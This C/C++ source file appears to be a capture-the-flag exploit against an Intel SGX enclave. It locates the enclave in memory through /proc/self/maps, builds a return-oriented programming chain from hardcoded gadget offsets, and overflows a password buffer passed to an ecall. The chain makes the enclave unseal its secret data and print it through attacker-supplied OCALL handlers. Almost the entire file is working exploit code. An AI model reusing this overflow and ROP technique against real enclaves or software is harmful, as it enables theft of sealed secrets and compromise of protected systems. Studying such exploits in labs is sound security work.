#include "sgx_urts.h"
#include "sgx_edger8r.h"

#include "string.h"
#include "stdio.h"
#include "unistd.h"
#include "fcntl.h"
#include <fstream>

using namespace std;

int ocall_save_data(const uint8_t* sealed_data, const size_t sealed_size) {
	printf("%s\n", sealed_data);
	return 0;
}

int enclave_ocall_save_data(void * ms) {
	uint64_t* ms1 = (uint64_t*)ms;
	ms1[0] = ocall_save_data((uint8_t*)ms1[1], (size_t)ms1[2]);
	return 0;
}

int ocall_is_data(void) {
	printf("This should not happen\n");
	return 0;
}

int enclave_ocall_is_data(void * ms) {
	uint64_t* ms1 = (uint64_t*)ms;
	ms1[0] = ocall_is_data();
	return 0;
}


int ocall_load_data(uint8_t* sealed_data, const size_t sealed_size) {
		printf("Reading data\n");
		FILE *ptr;
		ptr = fopen("data.seal","rb");  // r for read, b for binary
		fread(sealed_data,1,0x2b0,ptr); // read 10 bytes to our buffer
		for(int i = 0; i < 0x2b0; i++) {
			printf("%hhx ", sealed_data[i]);
		}
		fclose(ptr);
		printf("\n");
		return 0;
}

int enclave_ocall_load_data(void * ms) {
	uint64_t* ms1 = (uint64_t*)ms;
	ms1[0] = ocall_load_data((uint8_t*)ms1[1], (size_t)ms1[2]);
	return 0;
}


int main(int argc, char** argv) {

		sgx_enclave_id_t eid = 0;
		sgx_launch_token_t token = {0};
		int updated, ret;
		sgx_status_t ecall_status, enclave_status;

		enclave_status = sgx_create_enclave("enclave.signed.so", 0, &token, &updated, &eid, NULL);
		if(enclave_status != SGX_SUCCESS) {
				printf("Fail to initialize enclave.\n"); 
				return -1;
		}
		printf("Enclave successfully initialized.\n");

		int fd = open("/proc/self/maps", O_RDONLY);
		char buf[100000];
		read(fd, buf, 100000);

		printf("%s\n\n\n\n", buf);

		char *p, *temp;
		int i = 0;
		p = strtok_r(buf, "\n", &temp);
		printf("%s\n", p);
		char * binary_start;
		sscanf(p, "%p-", &binary_start);
		do {
			i++;
		} while ((p = strtok_r(NULL, "\n", &temp)) != NULL && i < 5);
		p = strtok_r(NULL, "\n", &temp);
		printf("%s\n", p);

		void * enclave_start;
		sscanf(p, "%p-", &enclave_start);
		printf("Enclave start found at: %p\n", enclave_start);
	
		i = 0;	
		do {
			i++;
		} while ((p = strtok_r(NULL, "\n", &temp)) != NULL && i < 7);

		void * enclave_writeable;
		sscanf(p, "%p-", &enclave_writeable);
		printf("%s\n", p);
		printf("writable: %p\n", enclave_writeable);

		uint64_t ocall_table[] = {3,
			(uint64_t)&enclave_ocall_save_data,
			(uint64_t)&enclave_ocall_load_data,
			(uint64_t)&enclave_ocall_is_data};

		for(int j = 0; j < 4; j++) {
			printf("%p\n", ocall_table[j]);
		}

		int pop_rdi = 0x0000000000012eb8;
		int pop_rsi = 0x0000000000022bea;
		int pop_rdx_rcx = 0x00000000000135d3;
		int enclave_exit = 0;

		int ocall_ret = 0;
		char sealed_data[0x2b0];
		char unsealed_data [0x80];

		// ocall_load_data ( &ocall_ret, sealed_data, 0x2b0 );
		// unseal_data ( sealed_data, unsealed_data, 0x80 );
		int ocall_load_data = 0x3782;
		int unseal_data = 0x3c66;
		int ocall_save_data = 0x3605;

		uint64_t exploit[200];
		for(int j = 0; j < 200; j++) {
			exploit[j] = 0;
		}

		(exploit[0]) = (uint64_t)enclave_start + pop_rdi;
		(exploit[1]) = (uint64_t)(&ocall_ret);
		(exploit[2]) = (uint64_t)enclave_start + pop_rsi;
		(exploit[3]) = (uint64_t)enclave_writeable;
		(exploit[4]) = (uint64_t)enclave_start + pop_rdx_rcx;
		(exploit[5]) = (uint64_t)0x2b0;
		(exploit[6]) = (uint64_t)0;
		(exploit[7]) = (uint64_t)enclave_start + ocall_load_data;
		
		(exploit[8]) = (uint64_t)enclave_start + pop_rdi;
		(exploit[9]) = (uint64_t)enclave_writeable;
		(exploit[10]) = (uint64_t)enclave_start + pop_rsi;
		(exploit[11]) = (uint64_t)enclave_writeable+0x300;
		(exploit[12]) = (uint64_t)enclave_start + pop_rdx_rcx;
		(exploit[13]) = (uint64_t)0x80;
		(exploit[14]) = (uint64_t)0;
		(exploit[15]) = (uint64_t)enclave_start + unseal_data;
		
		(exploit[16]) = (uint64_t)enclave_start + pop_rdi;
		(exploit[17]) = (uint64_t)(&ocall_ret);
		(exploit[18]) = (uint64_t)enclave_start + pop_rsi;
		(exploit[19]) = (uint64_t)enclave_writeable+0x300;
		(exploit[20]) = (uint64_t)enclave_start + pop_rdx_rcx;
		(exploit[21]) = (uint64_t)0x2b0;
		(exploit[22]) = (uint64_t)0;
		(exploit[23]) = (uint64_t)enclave_start + ocall_save_data;

		
		printf("get_flag at: %p\n", 0x388f + (uint64_t)enclave_start);
		printf("within_enclave at: %p\n", 0x3a73 + (uint64_t)enclave_start);
		printf("calc_sealed: %p\n", 0x1f00c + (uint64_t)enclave_start);
		printf("unseal: %p\n", 0x3a3a + (uint64_t)enclave_start);

		char password[1000];
		for(int j = 0; j < 1000; j++) {
			password[j] = 0;
		}
		char buffer[512];
		int overflow = 0xb8; //was 0xc8
		for(int j = 0; j < overflow; j++) {
			password[j] = 'a';
		}
		memcpy(password+overflow, exploit, 400);
		printf("%x\n", strlen(password));
		char * password1 = "thisisastrongpassword_1234!!\n";
		int len = 0x400;
		int len1 = 0x80;
		uint64_t marshal[0x40] = {0x0, (uint64_t)"abc123", 0x7, (uint64_t)password, (uint64_t)(&len), (uint64_t)buffer};
		uint64_t marshal1[0x40] = {0x0, (uint64_t)"abc123", 0x7, (uint64_t)password1, (uint64_t)(&len1), (uint64_t)buffer};
		
		int x = sgx_ecall(eid, 1, ocall_table, marshal);
		printf("%x %x\n", x, marshal[0]);

		sgx_target_info_t info;
		sgx_get_target_info(eid, &info);

		// destroy enclave
		enclave_status = sgx_destroy_enclave(eid);
		if(enclave_status != SGX_SUCCESS) {
				printf("Fail to destroy enclave.\n"); 
				return -1;
		}
		printf("Enclave successfully destroyed.\n");

		printf("Program exit success.\n");
		return 0;
}
